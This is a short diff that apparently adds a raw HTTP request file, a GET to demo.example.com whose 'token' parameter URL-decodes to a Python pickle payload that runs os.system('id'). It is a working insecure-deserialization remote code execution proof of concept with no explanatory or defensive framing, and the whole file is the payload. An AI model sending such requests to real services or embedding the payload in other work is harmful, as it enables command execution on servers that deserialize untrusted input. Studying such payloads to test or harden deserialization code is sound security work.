@@ -1,0 +1,4 @@
+GET /a?token=cos%0Asystem%0A%28S%27id%27%0AtR. HTTP/1.1
+Host: demo.example.com
+Connection: close
+
